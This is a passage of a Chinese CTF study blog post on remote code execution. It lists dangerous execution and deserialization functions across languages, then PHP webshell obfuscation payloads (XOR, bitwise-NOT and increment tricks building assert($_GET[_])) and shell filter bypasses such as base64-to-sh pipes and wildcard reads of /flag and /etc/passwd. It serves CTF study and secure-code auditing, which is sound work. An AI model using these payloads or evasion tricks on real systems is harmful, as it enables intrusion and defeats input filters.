+<li><code>assert()</code>：旧版 PHP 可当作 eval 用，传入字符串会执行 PHP 代码（PHP7.2 后废弃此能力）</li>
+<li><code>create_function()</code>：创建匿名函数，字符串参数会被解析为代码（PHP7.2 移除）</li>
+</ol>
+<blockquote>
+<p>额外高危：文件包含 <code>include</code> &#x2F; <code>require</code> &#x2F; <code>include_once</code>，包含用户可控文件，文件内 PHP 代码会执行（LFI&#x2F;RFI，间接 RCE）</p>
+</blockquote>
+<hr>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="命令执行（调用系统-shell）"><a href="#命令执行（调用系统-shell）" class="headerlink" title="命令执行（调用系统 shell）"></a>命令执行（调用系统 shell）</h3><ol>
+<li><p><code>os.system(cmd)</code>：执行 shell 命令，直接输出到终端，返回退出状态码</p>
+</li>
+<li><p><code>os.popen(cmd)</code>：执行 shell 命令，返回文件对象可读结果</p>
+</li>
+<li><p><code>subprocess.call(cmd, shell=True)</code>&#x2F;<code>subprocess.run(cmd, shell=True)</code>&#x2F;<code>subprocess.check_output()</code></p>
+<p>——危险写法：传字符串 <code>subprocess.call(&quot;ping &quot;+ip, shell=True)</code>（按 shell 解析字符串）</p>
+<p>——安全写法：传列表 <code>subprocess.call([&quot;ping&quot;,ip])</code>，<code>shell=False</code> 不会启动 shell，无法注入</p>
+</li>
+<li><p><code>commands.getoutput(cmd)</code>：Python2 专用，执行并返回输出字符串</p>
+</li>
+</ol>
+<h3 id="代码执行（解析-Python-代码）"><a href="#代码执行（解析-Python-代码）" class="headerlink" title="代码执行（解析 Python 代码）"></a>代码执行（解析 Python 代码）</h3><ol>
+<li><code>eval(str)</code>：将字符串作为<strong>表达式</strong>求值并返回结果（不能执行语句）</li>
+<li><code>exec(str)</code>：<strong>最经典</strong>，将字符串作为<strong>代码块</strong>执行，无返回值</li>
+<li><code>compile(str, filename, mode)</code>：编译字符串为代码对象，常与 exec&#x2F;eval 配合</li>
+<li><code>pickle.loads(bytes)</code>：反序列化字节流，触发对象 <code>__reduce__</code> 等魔术方法，可造成 RCE</li>
+<li><code>yaml.load(stream)</code>：PyYAML 旧版不安全，可构造恶意对象执行代码（应用 <code>safe_load</code>）</li>
+</ol>
+<hr>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><blockquote>
+<p> 企业级应用重灾区，Java 很少直接写 eval 类函数，RCE 大多来自<code>Runtime.exec</code>、反序列化、JNDI 注入</p>
+</blockquote>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ol>
+<li><p><code>Runtime.getRuntime().exec(cmd)</code>：执行命令；<strong>只按空格拆分</strong></p>
+<p>——传入字符串时会启动 shell，可命令注入；复杂 shell 语法失效（常见绕过点，但需配合其他技巧）</p>
+<p>——传入字符串数组则安全，不会解析管道、分号等特殊符号</p>
+</li>
+<li><p><code>ProcessBuilder(cmdList).start()</code>：可执行命令，传列表可精确控制参数</p>
+</li>
+</ol>
+<h3 id="代码执行-反序列化"><a href="#代码执行-反序列化" class="headerlink" title="代码执行 &#x2F; 反序列化"></a>代码执行 &#x2F; 反序列化</h3><ol>
+<li><code>ScriptEngine.eval(str)</code>：脚本引擎执行 JS&#x2F;Groovy 等代码字符串</li>
+<li><code>SpringExpressionParser.parseExpression(str).getValue()</code>：SpEL 表达式求值，历史上多个 Spring 高危 RCE 源于此</li>
+<li><code>ObjectInputStream.readObject()</code>：<strong>Java 原生反序列化</strong>，配合依赖中的 gadget 链触发 RCE（Fastjson、Shiro、WebLogic 等重灾区）</li>
+<li><code>XMLDecoder.readObject()</code>：JDK 自带 XML 反序列化，可直接执行任意代码，极危险</li>
+<li><code>Class.forName()</code> + <code>newInstance()</code>：动态加载并实例化类，配合可控类名&#x2F;路径可 RCE</li>
+<li><code>JndiTemplate.lookup()</code> &#x2F; <code>InitialContext.lookup()</code>：JNDI 注入，可加载远程恶意类（Log4j2 漏洞核心）</li>
+</ol>
+<blockquote>
+<p>注意：Java 本身没有像 PHP eval 那样直接执行字符串代码的内置函数。</p>
+</blockquote>
+<hr>
+<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><ol>
+<li><code>child_process.exec(cmd, cb)</code>：启动 shell 执行命令，结果在回调中返回</li>
+<li><code>child_process.execSync(cmd)</code>：同步版本，直接返回输出字符串</li>
+<li><code>child_process.execFile()</code> &#x2F; <code>spawn()</code>：默认不经过 shell，相对安全</li>
+</ol>
+<h3 id="代码执行-反序列化-1"><a href="#代码执行-反序列化-1" class="headerlink" title="代码执行 &#x2F; 反序列化"></a>代码执行 &#x2F; 反序列化</h3><ol>
+<li><code>eval(str)</code> &#x2F; <code>new Function(str)()</code>：字符串作为 JS 代码执行，与浏览器 eval 同性质</li>
+<li><code>setTimeout(str)</code> &#x2F; <code>setInterval(str)</code>：参数为字符串时隐式 eval</li>
+<li><code>vm.runInContext(str, sandbox)</code>：在指定上下文执行代码，<strong>vm 不是安全沙箱</strong>，逃逸公开已久</li>
+<li><code>node-serialize</code> 的 <code>unserialize()</code>：该库会还原函数对象，直接 RCE（npm 上著名问题库）</li>
+<li><code>require()</code> 加载用户可控路径的模块文件</li>
+</ol>
+<blockquote>
+<p>Node 额外考点：原型链污染，配合上面函数实现 RCE</p>
+</blockquote>
+<hr>
+<h2 id="C-C-（底层与缓冲区溢出结合）"><a href="#C-C-（底层与缓冲区溢出结合）" class="headerlink" title="C &#x2F; C++（底层与缓冲区溢出结合）"></a>C &#x2F; C++（底层与缓冲区溢出结合）</h2><h3 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h3><ol>
+<li><code>system(cmd)</code>：调用 <code>/bin/sh -c</code> 执行命令，返回退出状态</li>
+<li><code>popen(cmd, mode)</code>：执行命令并打开管道读写其输入&#x2F;输出</li>
+<li><code>exec*()</code> 族（<code>execl/execv/execvp</code> 等）：替换当前进程映像执行新程序</li>
+<li><code>ShellExecute()</code> &#x2F; <code>WinExec()</code>：Windows 下执行程序或打开文件</li>
+</ol>
+<h3 id="代码执行-内存类"><a href="#代码执行-内存类" class="headerlink" title="代码执行 &#x2F; 内存类"></a>代码执行 &#x2F; 内存类</h3><ol>
+<li><code>dlopen(path)</code> &#x2F; <code>LoadLibrary(path)</code>：加载动态库，库文件构造器即执行代码</li>
+<li><code>strcpy</code> &#x2F; <code>sprintf</code> &#x2F; <code>gets</code>：不检查边界的字符串函数，缓冲区溢出可覆盖返回地址劫持控制流（经典二进制利用入口）</li>
+</ol>
+<hr>
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><h3 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h3><ol>
+<li><code>system(cmd)</code> 字符串形式：经过 shell；数组形式 <code>system(&quot;cmd&quot;, &quot;arg&quot;)</code> 不经过 shell</li>
+<li>反引号 <code>cmd</code>：执行 shell 命令，返回标准输出</li>
+<li><code>%x&#123;cmd&#125;</code>：与反引号等价</li>
+<li><code>Kernel.spawn(cmd)</code> &#x2F; <code>exec(cmd)</code>：创建或替换进程执行命令</li>
+</ol>
+<h3 id="代码执行-反序列化-2"><a href="#代码执行-反序列化-2" class="headerlink" title="代码执行 &#x2F; 反序列化"></a>代码执行 &#x2F; 反序列化</h3><ol>
+<li><code>eval(str)</code>：执行 Ruby 代码字符串</li>
+<li><code>ERB.new(template).result</code>：渲染 ERB 模板，模板内容即为 Ruby 代码（模板注入直接 RCE）</li>
+<li><code>Marshal.load(data)</code>：反序列化 Ruby 对象，类加载过程可执行代码</li>
+<li><code>YAML.load(data)</code>：旧 Psych 版本可构造恶意对象执行任意代码</li>
+</ol>
+<hr>
+<h2 id="C-NET"><a href="#C-NET" class="headerlink" title="C# &#x2F; .NET"></a>C# &#x2F; .NET</h2><h3 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h3><ol>
+<li><code>Process.Start(startInfo)</code>：<code>UseShellExecute=true</code> 时经 shell 解析；<code>ArgumentList</code> 逐项传参较安全</li>
+<li><code>PowerShell.Create().AddScript(str).Invoke()</code>：执行 PowerShell 脚本字符串</li>
+</ol>
+<h3 id="代码执行-反序列化-3"><a href="#代码执行-反序列化-3" class="headerlink" title="代码执行 &#x2F; 反序列化"></a>代码执行 &#x2F; 反序列化</h3><ol>
+<li><code>BinaryFormatter.Deserialize(stream)</code>：<strong>最危险</strong>的反序列化器，微软官方建议淘汰，配合 gadget 直接 RCE</li>
+<li><code>Assembly.Load(bytes).CreateInstance(typeName)</code>：加载字节数组中的程序集并实例化</li>
+<li><code>XamlReader.Parse(xaml)</code>：解析 XAML 可实例化任意类型（如 <code>ObjectDataProvider</code> 调方法）</li>
+<li><code>JavaScriptSerializer</code> &#x2F; Newtonsoft <code>TypeNameHandling.All</code>：反序列化时解析类型名可指定恶意类</li>
+</ol>
+<hr>
+<h2 id="Shell-Bash"><a href="#Shell-Bash" class="headerlink" title="Shell &#x2F; Bash"></a>Shell &#x2F; Bash</h2><ol>
+<li><code>eval str</code>：把字符串当 shell 命令<strong>二次解析</strong>（嵌套 eval 是经典提权链一环）</li>
+<li><code>source file</code> &#x2F; <code>. file</code>：在当前 shell 上下文执行文件内容</li>
+<li><code>exec cmd</code>：用命令替换当前 shell 进程</li>
+<li><code>$()</code> &#x2F; 反引号命令替换：本身正常，但替换内容来自可控输入时会级联执行</li>
+</ol>
+<hr>
+<h2 id="模板引擎（SSTI-类，提一下）"><a href="#模板引擎（SSTI-类，提一下）" class="headerlink" title="模板引擎（SSTI 类，提一下）"></a>模板引擎（SSTI 类，提一下）</h2><ol>
+<li>Python <strong>Jinja2</strong>：<code>Template(source).render()</code>，模板字符串可控即 Python RCE</li>
+<li>Java <strong>Freemarker</strong>：<code>Template.process()</code>，<code>new</code> 指令与内建函数利用</li>
+<li>PHP <strong>Smarty</strong>：<code>fetch(&quot;string:...&quot;)</code> &#x2F; <code>&#123;php&#125;</code> 标签（旧版）</li>
+<li>Ruby <strong>ERB</strong>、Node <strong>EJS&#x2F;Pug</strong>、.NET <strong>Razor</strong>：原理相同——模板即代码，可控模板源即 RCE</li>
+</ol>
+<hr>
+<p><strong>审计要点</strong>：每个语言都遵循同一模式——<code>用户输入 → 字符串拼接/反序列化 → 解释执行</code>。CTF 中 PHP 考 <code>eval</code>&#x2F;<code>assert</code>&#x2F;<code>preg_replace /e</code> 最密集；真实攻防中 Java 反序列化和 Node&#x2F;Python 的 <code>pickle</code>&#x2F;<code>node-serialize</code> 类依赖漏洞占比最高。</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>到了最折腾的板块了，在基础的 RCE 里面，绕过方式真的是占据了 RCE 的半壁江山了，原理一眼看懂，难点全卡在绕过，并且还有许多奇技淫巧，总之折腾的不行。</p>
+<p>PHP 内置同时拥有大量命令执行函数 + eval，而且早年大量 CMS 直接写这类危险代码，CTF 出题最喜欢拿 PHP 写这类题，下面介绍一些 PHP 中 RCE 的一些绕过方式，以及<code>disable_functions</code>禁用 system 的 PHP 原生函数： </p>
+<h1 id="代码-命令の函数名"><a href="#代码-命令の函数名" class="headerlink" title="代码&amp;命令の函数名"></a>代码&amp;命令の函数名</h1><h2 id="1、大小写"><a href="#1、大小写" class="headerlink" title="1、大小写"></a>1、大小写</h2><p>PHP 的函数名和关键字<strong>不区分大小写</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">EVAL</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);   <span class="comment">// 与 eval 等价</span></span><br><span class="line"><span class="title function_ invoke__">System</span>(<span class="string">&#x27;id&#x27;</span>);      <span class="comment">// 与 system 等价</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2、字符串拼接"><a href="#2、字符串拼接" class="headerlink" title="2、字符串拼接"></a>2、字符串拼接</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也可以用.拼接</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>;     <span class="comment">//(sy.(ste).m)</span></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);       <span class="comment">// 等价 system($_GET[&#x27;c&#x27;])</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3、base编码重组"><a href="#3、base编码重组" class="headerlink" title="3、base编码重组"></a>3、base编码重组</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;c3lzdGVt&#x27;</span>);   <span class="comment">//system</span></span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>2、3、配合 <code>strrev</code>、<code>str_rot13</code>、<code>gzuncompress</code>、<code>hex2bin</code> 等可对抗只匹配字面量的规则。</p>
+<h2 id="4、-变量函数与回调"><a href="#4、-变量函数与回调" class="headerlink" title="4、 变量函数与回调"></a>4、 变量函数与回调</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fn</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];        <span class="comment">// 函数名完全来自外部</span></span><br><span class="line"><span class="variable">$fn</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);         <span class="comment">// 可变函数调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], [<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]]);</span><br></pre></td></tr></table></figure>
+
+<p>PHP 中很多”回调型”函数（<code>usort</code>、<code>array_filter</code>、<code>preg_replace_callback</code>、<code>register_shutdown_function</code>）都能充当间接调用点，黑名单很难封全。</p>
+<h2 id="5、可变函数"><a href="#5、可变函数" class="headerlink" title="5、可变函数"></a>5、可变函数</h2><p><code>$fn=$_GET[&#39;f&#39;]; $fn()</code></p>
+<h2 id="6、无字母数字"><a href="#6、无字母数字" class="headerlink" title="6、无字母数字"></a>6、无字母数字</h2><p>不能写任何字母和数字，但可以用 <code>$ _ [ ] ( ) &quot; &#39; ^ ~ + .</code> 等。目标是拼出 <code>assert($_GET[_])</code> 之类的执行语句。通过取反 <code>~</code>、异或 <code>^</code>、数组自增 <code>$_[]++</code> 构造字符，场景设定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[a-zA-Z0-9]/&#x27;, $_GET[&#x27;code&#x27;])) die(&#x27;no&#x27;);</span><br><span class="line">eval($_GET[&#x27;code&#x27;]);   // 只允许输入特殊字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="手法-1：异或-构造字符："><a href="#手法-1：异或-构造字符：" class="headerlink" title="手法 1：异或 ^ 构造字符："></a>手法 1：异或 <code>^</code> 构造字符：</h3><p>原理：<code>a ^ b = c</code>，那么已知任意两个就能求第三个。用两个<strong>允许字符</strong>异或出<strong>被禁字母</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;%13&#x27; ^ &#x27;`&#x27; = 0x13 ^ 0x60 = 0x73 = &#x27;s&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>多个异或结果拼接，即可拼出函数名（经典写法，逐字符拼 <code>assert</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="comment">// $_ 现在是 assert（每个 &#x27;%xx&#x27; 与 &#x27;`&#x27; 异或出一个字母）</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0d&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2f&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0e&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);   <span class="comment">// 拼出 &quot;_GET&quot; 的部分</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[_](<span class="variable">$__</span>[_]);   <span class="comment">// 间接调用</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：这个写法里用了数字（<code>%13</code>），适用于”禁字母”的场景；连数字也禁时用下面两种。</p>
+</blockquote>
+<h3 id="手法-2：取反-构造（无数字时首选）"><a href="#手法-2：取反-构造（无数字时首选）" class="headerlink" title="手法 2：取反 ~ 构造（无数字时首选）"></a>手法 2：取反 <code>~</code> 构造（无数字时首选）</h3><p><code>~</code> 对字符串<strong>逐字节取反</strong>：<code>~&quot;\x9e&quot;</code> &#x3D; <code>&quot;a&quot;</code>（0x9E 取反 &#x3D; 0x61）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;⟨非目标字节⟩&quot;</span>;   <span class="comment">// 这一串字节的每个字节取反后 = &quot;assert&quot;</span></span><br><span class="line"><span class="comment">// 源串里全是高位字节（非字母数字），过滤放行</span></span><br><span class="line"><span class="variable">$_</span>(~<span class="variable">$_GET</span>[<span class="number">0</span>]);          <span class="comment">// 传入的参数也用取反编码</span></span><br></pre></td></tr></table></figure>
+
+<p>payload示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~&quot;\x9e\x8c\x8c\x9a\x8d\x8b&quot;;     // 取反 = assert</span><br><span class="line">$__=~&quot;\xa0\xb8\xba\xab&quot;;            // 取反 = _GET</span><br><span class="line">$___=$_($__[_]);                    // assert($_GET[_])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部配合：攻击者本地对 payload 每个字节取反后提交，webshell 内取反还原。<strong>传输和存储的形态完全不含字母数字</strong>。</p>
+<p><strong>关键细节</strong>：上面代码块里用 <code>\x9e</code> 只是<strong>演示字节值</strong>——<code>\x</code> 含字母 x，真实场景不能用。实战做法是本地生成原始字节直接嵌入文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地生成取反字节（Python）</span></span><br><span class="line">target = <span class="string">b&#x27;assert&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(~b &amp; <span class="number">0xff</span>) <span class="keyword">for</span> b <span class="keyword">in</span> target))   <span class="comment"># 输出的非打印字符粘进 PHP 字符串</span></span><br></pre></td></tr></table></figure>
+
+<p>嵌入后源文件里就是一堆高位字节（显示为乱码），传输、存储、过滤扫描都不含字母数字。<strong>这是三种手法里最干净的</strong>。</p>
+<h3 id="手法-3：自增-构造（字母表遍历）"><a href="#手法-3：自增-构造（字母表遍历）" class="headerlink" title="手法 3：自增 ++ 构造（字母表遍历）"></a>手法 3：自增 <code>++</code> 构造（字母表遍历）</h3><p>PHP 的 <code>++</code> 作用于字符串是<strong>字符级递增</strong>（<code>&#39;A&#39;++ → &#39;B&#39;</code>）。问题是怎么拿到第一个字母：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];          <span class="comment">// 空数组</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;        <span class="comment">// 数组被强转为字符串 &quot;Array&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">0</span>];      <span class="comment">// &#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;          <span class="comment">// &#x27;B&#x27; … 一路可以推到 &#x27;Z&#x27;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// F</span></span><br></pre></td></tr></table></figure>
+
+<p>进一步：<code>&quot;Array&quot;</code> 本身还直接提供 <code>&#39;a&#39; &#39;r&#39; &#39;y&#39;</code>（<code>$_[3]=&#39;a&#39;</code>），从 <code>&#39;a&#39;</code> 又能推到 <code>&#39;b&#39;~&#39;m&#39;</code>，从 <code>&#39;r&#39;</code> 推到 <code>&#39;s&#39;~&#39;z&#39;</code>。缺失的字母（如 <code>n o p q</code>）用 <strong>大写异或空格</strong> 补：<code>N ^ &#39; &#39;</code> &#x3D; <code>n</code>（0x4E ^ 0x20 &#x3D; 0x6E）。</p>
+<p>三个手法经常混用：异或拼骨架 + 自增补缺失 + 取反做外部编码。</p>
+<h1 id="命令名绕过（shell-层）"><a href="#命令名绕过（shell-层）" class="headerlink" title="命令名绕过（shell 层）"></a>命令名绕过（shell 层）</h1><p>假设 <code>system($_GET[&#39;c&#39;])</code> 可用，但对 <code>c</code> 的内容做了关键字过滤：</p>
+<h2 id="1、通配符"><a href="#1、通配符" class="headerlink" title="1、通配符"></a>1、通配符</h2><p>通配符由 shell 展开，当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。目标文件名不出现在命令行字符串里，所以过滤 <code>flag</code>、<code>cat</code> 关键字无效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /fla*          # 文件名不完整也能命中</span><br><span class="line">cat fla?????       # ？ 一对一</span><br><span class="line">/???/???64 ???     # 用通配符拼出 /usr/bin/base64 等</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、单双反引号-反斜杠"><a href="#2、单双反引号-反斜杠" class="headerlink" title="2、单双反引号&amp;反斜杠"></a>2、单双反引号&amp;反斜杠</h2><p>对php来说这是fl””ag而不是flag，关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\进行转义，避免报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca&#x27;&#x27;t /etc/passwd</span><br><span class="line">ca&quot;&quot;t /etc/passwd</span><br><span class="line">ca``t /etc/passwd</span><br><span class="line">ca\t flag   # 反斜杠转义空格，使 grep 型规则匹配错位</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、变量赋值重组"><a href="#3、变量赋值重组" class="headerlink" title="3、变量赋值重组"></a>3、变量赋值重组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;</span><br><span class="line">$a$b$c flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、编码-解码绕行"><a href="#4、编码-解码绕行" class="headerlink" title="4、编码 &#x2F; 解码绕行"></a>4、编码 &#x2F; 解码绕行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=system(base64_decode(&#x27;dGFjIGZsYSo=&#x27;)); 推荐👍</span><br><span class="line">echo Y2F0IC9mbGFn | base64 -d | sh    # base64：cat /flag</span><br><span class="line">echo &#x27;(hex编码)&#x27; | xxd -r -p | bash   # hex编码</span><br><span class="line">printf &#x27;\143\141\164&#x27; flag    # 八进制 cat</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、命令替换嵌套"><a href="#5、命令替换嵌套" class="headerlink" title="5、命令替换嵌套"></a>5、命令替换嵌套</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo Y2F0|base64 -d) flag  //cat</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Shell命令の替换绕过"><a href="#Shell命令の替换绕过" class="headerlink" title="Shell命令の替换绕过"></a>Shell命令の替换绕过</h1><h2 id="Shell命令过滤："><a href="#Shell命令过滤：" class="headerlink" title="Shell命令过滤："></a>Shell命令过滤：</h2><p>黑名单常针对高频词，被过滤时的替代命令速查：</p>
+<table>
+<thead>
+<tr>
+<th>被禁</th>
+<th>替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cat</code></td>
+<td><code>tac</code>、<code>nl</code>、<code>head</code>、<code>less</code>、<code>sort</code>、<code>type</code>、<code>rev</code>、<code>strings</code>、<code>dd if=flag</code></td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td><code>dir</code>、<code>find .</code>、<code>echo *</code>（glob 展开）、<code>printf &#39;%s\n&#39; *</code></td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td><code>/usr/bin/id</code>、<code>groups</code>、<code>whoami</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>、<code>&lt;&gt;</code>、tab 替换</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>用 <code>cd</code> 分段进入、<code>$&#123;PATH:0:1&#125;</code> 拼接斜杠</td>
+</tr>
+<tr>
+<td><code>flag</code> 字样</td>
+<td>通配符 <code>fla*</code>、<code>f?ag</code>、<code>[f]lag</code></td>
+</tr>
+</tbody></table>
+<h3 id="CAT："><a href="#CAT：" class="headerlink" title="CAT："></a>CAT：</h3><table>
+<thead>
+<tr>
+<th>替代</th>
+<th>用法</th>
+<th>原理&#x2F;输出差异</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tac✅</code></td>
+<td><code>tac /flag</code></td>
+<td>从<strong>最后一行往前</strong>输出，内容一样但顺序反转</td>
+</tr>
+<tr>
+<td><code>nl</code>✅</td>
+<td><code>nl /flag</code></td>
+<td>输出<strong>带行号</strong>的 flag，行尾可能有空白</td>
+</tr>
+<tr>
+<td><code>head</code>✅</td>
+<td><code>head /flag</code> 或 <code>head -n 100 /flag</code></td>
+<td>默认前 10 行，flag 一般一行所以完整</td>
+</tr>
+<tr>
+<td><code>less</code>&#x2F;<code>more</code>✅</td>
+<td>交互式，盲打环境下意义不大，一般不用</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>sort✅</code></td>
+<td><code>sort /flag</code></td>
+<td>按行排序输出，单行 flag 等于原样输出</td>
+</tr>
+<tr>
+<td><code>rev</code>✅</td>
+<td><code>rev /flag</code></td>
+<td><strong>字符级反转</strong>，拿到结果后要自己再反转回来</td>
+</tr>
+<tr>
+<td><code>strings</code></td>
+<td><code>strings /flag</code></td>
+<td>提取可打印字符序列，文本文件原样输出</td>
+</tr>
+<tr>
+<td><code>dd</code></td>
+<td><code>dd if=/flag</code></td>
+<td><code>if=</code> 指定输入文件，内容写到<strong>标准输出</strong>（还会带统计信息到 stderr）</td>
+</tr>
+</tbody></table>
+<p>示例：CTFshow-web29：空格20%，打勾的%20fla?.???，都可读</p>
+<h3 id="LS："><a href="#LS：" class="headerlink" title="LS："></a>LS：</h3><table>
+<thead>
+<tr>
+<th>替代</th>
+<th>用法</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dir</code></td>
+<td><code>dir</code></td>
+<td>部分系统装了 GNU dir，输出接近 <code>ls -l</code></td>
+</tr>
+<tr>
+<td><code>find .</code></td>
+<td><code>find . -maxdepth 1</code></td>
+<td>列出当前目录项；不加参数会递归列全部子目录</td>
+</tr>
+<tr>
+<td><code>echo *</code></td>
+<td><code>echo *</code></td>
